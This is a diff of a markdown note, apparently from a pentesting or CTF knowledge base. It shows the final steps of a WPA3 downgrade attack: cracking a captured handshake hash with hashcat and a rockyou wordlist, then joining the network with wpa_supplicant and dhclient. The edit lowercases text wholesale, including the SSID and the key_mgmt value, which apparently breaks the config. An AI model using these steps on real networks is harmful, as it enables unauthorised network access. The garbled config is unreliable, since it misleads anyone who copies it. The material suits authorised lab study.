@@ -58,21 +58,21 @@ Crack with [hashcat](../../cybersecurity/TTPs/cracking/tools/hashcat.md):
 hashcat -a 0 -m 22000 downgrade.hash ~/rockyou-top100000.txt --force
 ```
 #### 8. Connect to the network
-Once you have the password, you can connect using `wpa_supplicant` with a conf file (`downgrade.conf`) that looks like this:
+once you have the password, you can connect using `wpa_supplicant` with a conf file (`downgrade.conf`) that looks like this:
 ```bash
 network={
-  ssid="wifi-IT"
-  psk="<PASSWORD>"
-  key_mgmt=SAE
+  ssid="wifi-it"
+  psk="<password>"
+  key_mgmt=sae
   scan_ssid=1
   ieee80211w=1
 }
 ```
-Then run the command:
+then run the command:
 ```bash
 sudo wpa_supplicant -i wlan2 -c ./downgrade.conf
 ```
-Then request your new IP address:
+then request your new ip address:
 ```bash
 dhclient wlan2 -v
 ```
